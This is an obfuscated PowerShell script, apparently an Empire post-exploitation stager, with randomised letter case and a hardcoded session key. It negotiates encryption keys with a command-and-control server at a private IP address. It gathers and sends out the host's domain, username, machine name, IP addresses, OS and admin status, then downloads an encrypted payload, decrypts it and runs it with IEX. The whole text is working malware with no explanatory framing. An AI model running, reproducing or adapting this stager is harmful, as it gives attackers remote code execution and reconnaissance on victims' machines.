functioN STaRt-NeGotIaTE{param($s,$SK,$UA="lol")AdD-TYpE -aSSemblY SYSTEM.SECurIty;ADd-Type -AssemBLy SyStEM.CorE;$ErrorActionPreference = "SilentlyContinue";$e=[SYStEm.TExT.ENCODInG]::ASCII;$AES=New-OBject SYSteM.SEcuritY.CRYpTOgRAPhy.AESCRYPTOSErvIcePRoVIdER;$IV = [BYte] 0..255 | GeT-RANDOm -CouNt 16;$AES.Mode="CBC"; $AES.Key=$e.GetBytes($SK); $AES.IV = $IV;$csp = NeW-ObJeCt SyStem.SecuRity.CRYptOgrAPHY.CSpPaRAMeTErs;$cSp.Flags = $cSp.FlaGS -BoR [SYsteM.SeCuriTY.CryPTOGRaPHy.CsPPROViDeRFLAgs]::USeMaChiNEKEySTORE;$RS = NeW-ObjeCt SYsTem.SEcUrITY.CryPtOgraPhY.RSACryPtOSeRvicePrOviDeR -ArgUMentLISt 2048,$Csp;$Rk=$RS.TOXMLSTRIng($FalSE);$r=1..16|ForEacH-ObjecT{GET-RaNDOM -maX 26};$ID=('ABCDEFGHKLMNPRSTUVWXYZ123456789'[$r] -jOIN '');$ib=$E.gEtbYtES($RK);$eB=$IV+$AES.CreatEENcrYPtoR().TRAnSFoRMFInalBloCk($ib,0,$IB.LENgTh);IF(-NOt $Wc){$wc=NEW-ObjEct System.nEt.WEBClieNt;$Wc.ProxY = [SYStEm.Net.WeBREQUEsT]::GeTSyStEmWeBPrOXY();$wc.ProXY.CReDEnTIALS = [SystEm.NEt.CREDENtiALCachE]::DefaUltCrEDENtIaLs;}$wc.Headers.Add("User-Agent",$UA);$wc.Headers.Add("Cookie","SESSIONID=$ID");$raw=$wc.UploadData($s+"index.jsp","POST",$eb);$DE=$e.GeTSTRING($rs.DEcRYPT($RaW,$FAlse));$EpocH=$dE[0..9] -JOiN'';$Key=$dE[10..$De.lENGTh] -jOiN '';$AES=New-ObJect SYSteM.SeCURItY.CryptOgraPhy.AesCRypTOSeRvicePROvidER;$IV = [BYTE] 0..255 | GEt-RANDoM -CoUNT 16;$AES.Mode="CBC"; $AES.Key=$e.GetBytes($key); $AES.IV = $IV;$I=$s+'|'+[ENvIRonMeNt]::USerDoMAinNAme+'|'+[ENVironMent]::USErName+'|'+[EnVIRonmEnt]::MACHIneNamE;$P=(gwMi WiN32_NeTworKADAPtErCOnFigURATIoN|WhErE{$_.IPADDResS}|SeLect -ExPanD IPADDRESS);$ip = @{$TRUE=$p[0];$False=$P}[$P.LenGTH -LT 6];iF(!$IP -OR $iP.TrIM() -eQ '') {$ip='0.0.0.0'};$i+="|$ip";$i+='|'+(GET-WMIOBJecT WIN32_OPeRaTINgSYsTEm).NamE.SPliT('|')[0];if(([Environment]::UserName).ToLower() -eq "system"){$i+='|True'}else {$i += "|" +([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")}$n=[SYSTem.DIAGnOsTiCS.PrOCESS]::GETCuRREntPRoCess();$I+='|'+$n.ProCeSSNAme+'|'+$n.ID;$i += '|' + $PSVeRsIOnTABLE.PSVErsIon.MAjor;$ib2=$e.getbyteS($i);$eB2=$IV+$AES.CReatEENCrYptoR().TRaNsFOrMFINalBlock($ib2,0,$IB2.LengTH);$wc.Headers.Add("User-Agent",$UA);$raw=$wc.UploadData($s+"index.php","POST",$eb2);$AES=NeW-ObJEct SYSteM.SECUriTY.CRYPTOGrAPhY.AEsCrYPtOSerVicePrOviDEr;$AES.Mode="CBC";$IV = $RAW[0..15];$AES.KEy=$E.GeTByTEs($kEy);$AES.IV = $IV;IEX $([SYStem.TexT.ENCodInG]::ASCII.GeTSTrINg( $($AES.CreAtEDEcryPTor().TRanSFoRmFINALBloCk($rAW[16..$RAW.LEngTh],0,$raw.LenGTh-16))));$AES=$NulL;$S2=$nUll;$Wc=$Null;$eb2=$nUll;$RAw=$NUlL;$IV=$Null;$wC=$NULL;$i=$Null;$ib2=$nuLL;[GC]::COLLeCt();Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -SessionKey $key -SessionID $ID -Epoch $epoch;} Start-Negotiate -s "http://192.168.2.7:8080/" -SK '3e*GkYLUSv6ab4OK!%Pi@$tq9\>|~u+R' -UA $u;
